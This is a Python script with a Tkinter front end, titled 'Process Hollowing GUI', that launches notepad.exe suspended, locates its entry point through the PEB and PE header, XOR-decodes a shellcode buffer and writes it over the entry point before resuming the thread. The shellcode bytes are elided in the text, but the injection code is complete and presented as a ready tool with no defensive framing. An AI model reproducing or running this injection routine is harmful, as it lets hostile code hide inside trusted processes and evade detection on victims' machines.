import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import messagebox
import threading

# Define constants
CREATE_SUSPENDED = 0x00000004
PROCESS_BASIC_INFORMATION = 0

# Define structures
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_ubyte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", ctypes.c_void_p),
        ("PebBaseAddress", ctypes.c_void_p),
        ("Reserved2", ctypes.c_void_p * 2),
        ("UniqueProcessId", ctypes.c_void_p),
        ("Reserved3", ctypes.c_void_p)
    ]


# Load functions
CreateProcess = ctypes.windll.kernel32.CreateProcessW
ResumeThread = ctypes.windll.kernel32.ResumeThread
ZwQueryInformationProcess = ctypes.windll.ntdll.ZwQueryInformationProcess
ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory


PROCESS_BASIC_INFORMATION_CLASS = 0
def main():
    #Create suspended state
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()

    CreateProcess(
        "C:\\Windows\\System32\\notepad.exe",
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )

    print("[1] Created suspended 'notepad.exe' with ProcId {}".format(pi.dwProcessId))


    # Get the address of the Process Environment Block
    pbi = PROCESS_BASIC_INFORMATION()
    retlen = ctypes.c_ulong()

    status = ZwQueryInformationProcess(
        pi.hProcess,
        PROCESS_BASIC_INFORMATION_CLASS,  # Use the integer constant here directly
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        ctypes.byref(retlen)
    )

    if status < 0:
        raise ctypes.WinError(ctypes.get_last_error())

    print("[2] PEB is at 0x{:X}".format(ctypes.cast(pbi.PebBaseAddress, ctypes.c_void_p).value))


    #Image Base Address
    image_base_address = ctypes.c_void_p()
    num_bytes_read = ctypes.c_ulonglong()

    # Cast PEB address to a void pointer and perform pointer arithmetic
    peb_address_plus_offset = ctypes.c_void_p(pbi.PebBaseAddress + 0x10)

    ReadProcessMemory(
        pi.hProcess,
        peb_address_plus_offset,  # Now a void pointer, which should be compatible with ReadProcessMemory
        ctypes.byref(image_base_address),
        ctypes.sizeof(image_base_address),
        ctypes.byref(num_bytes_read)
    )

    print("[3] Image Base Address is 0x{:X}".format(image_base_address.value))

    #EntryPoint address
    buf2 = (ctypes.c_byte * 0x200)()

    ReadProcessMemory(
        pi.hProcess,
        image_base_address,
        buf2,
        0x200,
        ctypes.byref(num_bytes_read)
    )

    e_lfanew = ctypes.c_uint.from_buffer(buf2, 0x3c).value
    entry_point_rva_offset = e_lfanew + 0x28
    entry_point_rva = ctypes.c_uint.from_buffer(buf2, entry_point_rva_offset).value
    entry_point_addr = image_base_address.value + entry_point_rva

    print("[4] Entry Point is 0x{:X}".format(entry_point_addr))

    #Shell code
    shellcode = bytearray(b"\x33\..........................................................\xD0")

    # XOR
    for i in range(len(shellcode)):
        shellcode[i] ^= 128

    # Convert the shellcode back to bytes
    shellcode_bytes = bytes(shellcode)

    # Ensure we have enough space for the shellcode
    if len(shellcode_bytes) > entry_point_rva:
        print("Shellcode is too large to fit at the Entry Point.")
    else:
        # Write the shellcode to the entry point
        bytes_written = ctypes.c_size_t()
        status = WriteProcessMemory(
            pi.hProcess,
            ctypes.c_void_p(entry_point_addr),  # Address to write to
            shellcode_bytes,  # The shellcode itself
            len(shellcode_bytes),  # Size of the shellcode
            ctypes.byref(bytes_written)  # Number of bytes written
        )

        if status == 0:
            raise ctypes.WinError(ctypes.get_last_error())

    print("[5] Wrote shellcode to Entry Point")

    # Resume
    ResumeThread(pi.hThread)

    print("[6] Resumed process thread")

# Function to be called when the start button is pressed
def on_start():
    try:
        # Run the main function in a separate thread to keep the GUI responsive
        threading.Thread(target=main).start()
    except Exception as e:
        messagebox.showerror("Error", str(e))

# Function to safely exit the GUI
def on_exit():
    root.destroy()

# GUI Initialization
root = tk.Tk()
root.title("Process Hollowing GUI")

# Start Button
start_button = tk.Button(root, text="Start", command=on_start)
start_button.pack(pady=20)

# Exit Button
exit_button = tk.Button(root, text="Exit", command=on_exit)
exit_button.pack(pady=20)

# Start the GUI event loop
root.mainloop()
